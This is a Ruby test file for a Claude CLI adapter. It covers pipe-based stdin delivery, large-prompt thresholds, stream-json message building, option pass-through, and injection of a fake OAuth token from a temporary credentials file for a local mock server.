  # pipe-based delivery so that regression cannot return.

  test "spawn_process_with_stdin delivers stdin through a pipe, not a regular file" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'

    captured_stat = nil
    @mock_process_manager.spawn_hook = lambda do |_args, options|
      # Inspect the stdin fd synchronously, before the caller closes its end.
      captured_stat = options[:in].stat
    end

    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)

    spawned = @mock_process_manager.spawned_processes.first
    assert_instance_of IO, spawned[:options][:in],
      "stdin must be an IO pipe (IO.pipe), not a File"
    refute_instance_of File, spawned[:options][:in],
      "stdin must NOT be a regular file — Claude CLI ignores file-based stdin in stream-json mode"
    assert captured_stat&.pipe?,
      "the fd handed to the child as stdin must be a pipe"
  end

  test "spawn_process_with_stdin offloads the write to a thread so the caller never blocks on a full pipe" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    # Exceed the OS pipe buffer (~64KB) so that an INLINE write would block the
    # caller until something drains the pipe — which is exactly what would
    # deadlock a GoodJob worker on a large base64 image payload.
    stdin_content = '{"type":"user","content":"' + ("x" * 200_000) + '"}'

    reader_dup = nil
    @mock_process_manager.spawn_hook = lambda do |_args, options|
      # Capture (dup) the read end but DELIBERATELY do not drain it yet. dup so
      # the fd survives the caller closing its own copy of the read end. With
      # nobody reading and a >64KB payload, an inline write inside the adapter
      # would block here forever.
      reader_dup = options[:in].dup
    end

    # Must return promptly even though nothing is draining the pipe. If the
    # write is ever moved back inline, this blocks past the timeout and fails
    # loudly instead of hanging the suite.
    Timeout.timeout(5) do
      @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)
    end

    # Now drain and confirm the entire payload still made it through the pipe.
    refute_nil reader_dup, "spawn_hook should have captured the read end"
    received = nil
    drain = Thread.new { received = reader_dup.read; reader_dup.close }
    drain.join(10)
    assert_equal stdin_content, received,
      "the entire stdin payload must reach the child through the pipe"
  end

  test "spawn_process_with_stdin delivers the full payload to a REAL spawned process via the pipe" do
    # End-to-end proof against a real OS process (real SystemProcessManager, real
    # Process.spawn, real pipe) — the layer the mock cannot exercise. This is the
    # exact regression: with the old file-based stdin the child read nothing; the
    # child here must receive the entire envelope, including a large base64-style
    # payload that exceeds the OS pipe buffer.
    adapter = ClaudeCliAdapter.new  # real process_manager + real file_system

    # The command runs with chdir: working_dir, so `cat` drains stdin into a file
    # we can read back. This stands in for Claude CLI reading its stream-json stdin.
    command = [ "sh", "-c", "cat > captured_stdin.json" ]

    big_payload = "y" * 150_000  # > ~64KB pipe buffer
    stdin_content = %({"type":"user","message":{"role":"user","content":[{"type":"text","text":"#{big_payload}"}]}})

    result = adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)
    Process.wait(result[:pid])  # wait for the real child to finish draining stdin

    captured_path = File.join(@test_dir, "captured_stdin.json")
    assert File.exist?(captured_path), "real child should have written the stdin it received"
    assert_equal stdin_content, File.read(captured_path),
      "the real spawned process must receive the entire stdin payload through the pipe"
  end

  test "spawn_process_with_stdin closes the pipe read end when spawn fails" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'

    captured_reader = nil
    @mock_process_manager.spawn_hook = lambda do |_args, options|
      captured_reader = options[:in]
      raise "boom: spawn failed"
    end

    assert_raises(ClaudeCliAdapter::ClaudeCliError) do
      @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)
    end

    refute_nil captured_reader, "spawn_hook should have captured the read end"
    assert captured_reader.closed?,
      "the pipe read end must be closed when spawn fails (no fd leak)"
  end

  test "execute propagates auto_compact_window override through to env" do
    @adapter.execute(prompt: "hello", session_id: "test-session", working_dir: @test_dir, auto_compact_window: 123_456)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "123456", env_vars["CLAUDE_CODE_AUTO_COMPACT_WINDOW"]
  end

  test "resume propagates auto_compact_window override through to env" do
    @adapter.resume(prompt: "follow-up", session_id: "test-session", working_dir: @test_dir, auto_compact_window: 321)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "321", env_vars["CLAUDE_CODE_AUTO_COMPACT_WINDOW"]
  end

  # ===== LARGE PROMPT HANDLING TESTS =====
  # When prompts exceed LARGE_PROMPT_THRESHOLD, use stdin-based delivery
  # to avoid OS ARG_MAX limits (typically ~2MB on Linux)

  test "LARGE_PROMPT_THRESHOLD constant is set to 100KB" do
    assert_equal 100.kilobytes, ClaudeCliAdapter::LARGE_PROMPT_THRESHOLD
  end

  test "large_prompt? returns false for nil" do
    result = @adapter.send(:large_prompt?, nil)
    assert_equal false, result
  end

  test "large_prompt? returns false for empty string" do
    result = @adapter.send(:large_prompt?, "")
    assert_equal false, result
  end

  test "large_prompt? returns false for small prompt" do
    small_prompt = "a" * 1000  # 1KB
    result = @adapter.send(:large_prompt?, small_prompt)
    assert_equal false, result
  end

  test "large_prompt? returns false for prompt at threshold" do
    # At exactly 100KB, should NOT trigger stdin mode (need to exceed)
    threshold_prompt = "a" * 100.kilobytes
    result = @adapter.send(:large_prompt?, threshold_prompt)
    assert_equal false, result
  end

  test "large_prompt? returns true for prompt exceeding threshold" do
    large_prompt = "a" * (100.kilobytes + 1)
    result = @adapter.send(:large_prompt?, large_prompt)
    assert_equal true, result
  end

  test "execute uses stdin for large prompts" do
    large_prompt = "a" * (100.kilobytes + 1)

    @adapter.execute(
      prompt: large_prompt,
      session_id: "large-prompt-session",
      working_dir: @test_dir
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]

    # Should use stream-json mode (via stdin) for large prompts
    assert_includes command, "-p"
    assert_includes command, "--input-format"
    assert_includes command, "stream-json"
    assert_includes command, "--session-id"
    assert_includes command, "large-prompt-session"

    # Prompt should NOT be in command (it's in stdin)
    refute_includes command, large_prompt
  end

  test "execute uses CLI argument for small prompts" do
    small_prompt = "small prompt under threshold"

    @adapter.execute(
      prompt: small_prompt,
      session_id: "small-prompt-session",
      working_dir: @test_dir
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]

    # Should use direct CLI argument (no stream-json)
    refute_includes command, "-p"
    refute_includes command, "--input-format"
    assert_includes command, small_prompt
    assert_includes command, "--session-id"
    assert_includes command, "small-prompt-session"
  end

  test "resume uses stdin for large prompts" do
    large_prompt = "a" * (100.kilobytes + 1)

    @adapter.resume(
      session_id: "large-resume-session",
      prompt: large_prompt,
      working_dir: @test_dir
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]

    # Should use stream-json mode (via stdin) for large prompts
    assert_includes command, "-p"
    assert_includes command, "--input-format"
    assert_includes command, "stream-json"
    assert_includes command, "--resume"
    assert_includes command, "large-resume-session"

    # Prompt should NOT be in command (it's in stdin)
    refute_includes command, large_prompt
  end

  test "resume uses CLI argument for small prompts" do
    small_prompt = "small resume prompt"

    @adapter.resume(
      session_id: "small-resume-session",
      prompt: small_prompt,
      working_dir: @test_dir
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]

    # Should use direct CLI argument (no stream-json)
    refute_includes command, "-p"
    refute_includes command, "--input-format"
    assert_includes command, small_prompt
    assert_includes command, "--resume"
    assert_includes command, "small-resume-session"
  end

  test "build_message_json creates text-only message when no images" do
    prompt = "test prompt without images"

    message_json = @adapter.send(:build_message_json, prompt: prompt, images: nil)
    parsed = JSON.parse(message_json)

    assert_equal "user", parsed["type"]
    assert_equal "user", parsed["message"]["role"]

    content = parsed["message"]["content"]
    assert_equal 1, content.length
    assert_equal "text", content[0]["type"]
    assert_equal prompt, content[0]["text"]
  end

  test "build_message_json handles empty images array" do
    prompt = "test prompt with empty images"

    message_json = @adapter.send(:build_message_json, prompt: prompt, images: [])
    parsed = JSON.parse(message_json)

    content = parsed["message"]["content"]
    assert_equal 1, content.length
    assert_equal "text", content[0]["type"]
    assert_equal prompt, content[0]["text"]
  end

  test "build_message_json handles nil prompt" do
    message_json = @adapter.send(:build_message_json, prompt: nil, images: nil)
    parsed = JSON.parse(message_json)

    content = parsed["message"]["content"]
    assert_equal 1, content.length
    assert_equal "text", content[0]["type"]
    assert_equal "", content[0]["text"]
  end

  test "execute with large prompt preserves all options" do
    large_prompt = "a" * (100.kilobytes + 1)

    @adapter.execute(
      prompt: large_prompt,
      session_id: "options-session",
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json",
      append_system_prompt: "custom context",
      dangerously_skip_permissions: true,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]
    env_vars = spawned[:env]

    assert_includes command, "--dangerously-skip-permissions"
    assert_includes command, "--debug"
    assert_includes command, "--append-system-prompt"
    assert_includes command, "custom context"
    assert_includes command, "--mcp-config"
    assert_includes command, "/path/to/mcp.json"
    assert_equal "180000", env_vars["MCP_TIMEOUT"]
  end

  test "resume with large prompt preserves all options" do
    large_prompt = "a" * (100.kilobytes + 1)

    @adapter.resume(
      session_id: "options-resume-session",
      prompt: large_prompt,
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json",
      append_system_prompt: "resume context",
      dangerously_skip_permissions: true,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]
    env_vars = spawned[:env]

    assert_includes command, "--dangerously-skip-permissions"
    assert_includes command, "--debug"
    assert_includes command, "--append-system-prompt"
    assert_includes command, "resume context"
    assert_equal "180000", env_vars["MCP_TIMEOUT"]
  end

  test "large_prompt? uses bytesize not character count" do
    # Each Japanese Hiragana character (あ) is 3 bytes in UTF-8
    # 100KB = 102,400 bytes, so we need 34134 characters to exceed (34134 * 3 = 102,402)
    multibyte_prompt = "\u3042" * 34134
    assert @adapter.send(:large_prompt?, multibyte_prompt)

    # 34133 characters × 3 bytes = 102,399 bytes < 100KB threshold (102,400)
    smaller_multibyte = "\u3042" * 34133
    refute @adapter.send(:large_prompt?, smaller_multibyte)
  end

  # ===== INJECT_API_KEY_FROM_CREDENTIALS TESTS =====
  # When ANTHROPIC_BASE_URL is set (e.g. for testing with a mock API server),
  # inject the current OAuth token from credentials as ANTHROPIC_API_KEY so the
  # Claude binary talks to the mock server using the right account token.

  test "inject_api_key_from_credentials sets ANTHROPIC_API_KEY when ANTHROPIC_BASE_URL is in env_vars" do
    credentials_dir = File.join(@test_dir, ".claude")
    FileUtils.mkdir_p(credentials_dir)
    credentials_path = File.join(credentials_dir, ".credentials.json")
    File.write(credentials_path, { "claudeAiOauth" => { "accessToken" => "test-oauth-token-123" } }.to_json)

    original_home = ENV["HOME"]
    ENV["HOME"] = @test_dir

    env_vars = { "ANTHROPIC_BASE_URL" => "http://127.0.0.1:9999" }
    @adapter.send(:inject_api_key_from_credentials, env_vars)

    assert_equal "test-oauth-token-123", env_vars["ANTHROPIC_API_KEY"]
  ensure
    ENV["HOME"] = original_home
  end

  test "inject_api_key_from_credentials sets ANTHROPIC_API_KEY when ANTHROPIC_BASE_URL is in ENV" do
    credentials_dir = File.join(@test_dir, ".claude")
    FileUtils.mkdir_p(credentials_dir)
    credentials_path = File.join(credentials_dir, ".credentials.json")
    File.write(credentials_path, { "claudeAiOauth" => { "accessToken" => "env-oauth-token" } }.to_json)

    original_home = ENV["HOME"]
    ENV["HOME"] = @test_dir

    env_vars = {}
    original_base_url = ENV["ANTHROPIC_BASE_URL"]
    ENV["ANTHROPIC_BASE_URL"] = "http://127.0.0.1:8888"

    @adapter.send(:inject_api_key_from_credentials, env_vars)

    assert_equal "env-oauth-token", env_vars["ANTHROPIC_API_KEY"]
  ensure
    ENV["HOME"] = original_home
    if original_base_url
      ENV["ANTHROPIC_BASE_URL"] = original_base_url
    else
      ENV.delete("ANTHROPIC_BASE_URL")
    end
  end

  test "inject_api_key_from_credentials is a no-op when no ANTHROPIC_BASE_URL" do
    original_base_url = ENV["ANTHROPIC_BASE_URL"]
    ENV.delete("ANTHROPIC_BASE_URL")

    env_vars = { "OTHER_VAR" => "value" }

    @adapter.send(:inject_api_key_from_credentials, env_vars)

    refute env_vars.key?("ANTHROPIC_API_KEY"), "Should not inject API key without ANTHROPIC_BASE_URL"
  ensure
    ENV["ANTHROPIC_BASE_URL"] = original_base_url if original_base_url
  end

  test "inject_api_key_from_credentials is a no-op when credentials file does not exist" do
    original_home = ENV["HOME"]
    ENV["HOME"] = @test_dir

    env_vars = { "ANTHROPIC_BASE_URL" => "http://127.0.0.1:9999" }
    @adapter.send(:inject_api_key_from_credentials, env_vars)

    refute env_vars.key?("ANTHROPIC_API_KEY"), "Should not inject API key when credentials file missing"
  ensure
    ENV["HOME"] = original_home
  end

  test "inject_api_key_from_credentials is a no-op when token is blank" do
    credentials_dir = File.join(@test_dir, ".claude")
    FileUtils.mkdir_p(credentials_dir)
    credentials_path = File.join(credentials_dir, ".credentials.json")
    File.write(credentials_path, { "claudeAiOauth" => { "accessToken" => "" } }.to_json)

    original_home = ENV["HOME"]
    ENV["HOME"] = @test_dir

    env_vars = { "ANTHROPIC_BASE_URL" => "http://127.0.0.1:9999" }
    @adapter.send(:inject_api_key_from_credentials, env_vars)

    refute env_vars.key?("ANTHROPIC_API_KEY"), "Should not inject blank API key"
  ensure
    ENV["HOME"] = original_home
  end

  test "inject_api_key_from_credentials handles malformed JSON gracefully" do
    credentials_dir = File.join(@test_dir, ".claude")
    FileUtils.mkdir_p(credentials_dir)
    credentials_path = File.join(credentials_dir, ".credentials.json")
    File.write(credentials_path, "not valid json")

    original_home = ENV["HOME"]
    ENV["HOME"] = @test_dir

    env_vars = { "ANTHROPIC_BASE_URL" => "http://127.0.0.1:9999" }

    assert_nothing_raised do
      @adapter.send(:inject_api_key_from_credentials, env_vars)
    end
    refute env_vars.key?("ANTHROPIC_API_KEY")
  ensure
    ENV["HOME"] = original_home
  end

  test "spawn_process calls inject_api_key_from_credentials when ANTHROPIC_BASE_URL is set" do
    credentials_dir = File.join(@test_dir, ".claude")
    FileUtils.mkdir_p(credentials_dir)
    credentials_path = File.join(credentials_dir, ".credentials.json")
    File.write(credentials_path, { "claudeAiOauth" => { "accessToken" => "rotated-token" } }.to_json)

    original_home = ENV["HOME"]
    ENV["HOME"] = @test_dir

    env_content = "ANTHROPIC_BASE_URL=http://127.0.0.1:9999"
    File.write(File.join(@test_dir, ".env"), env_content)

    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "rotated-token", env_vars["ANTHROPIC_API_KEY"]
  ensure
    ENV["HOME"] = original_home
  end

  test "execute with both large prompt and images uses stdin" do
    large_prompt = "a" * (100.kilobytes + 1)

    # Note: We can't fully test image loading here without setting up
    # mock file system, but we can verify the code path is taken
    # by checking the command format (stream-json mode)
    @adapter.execute(
      prompt: large_prompt,
      session_id: "combined-session",
      working_dir: @test_dir,
      # Images would trigger stdin mode too, but large prompt already does
      images: nil
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]

    # Verify stdin/stream-json mode is used
    assert_includes command, "-p"
    assert_includes command, "--input-format"
    assert_includes command, "stream-json"
  end
end
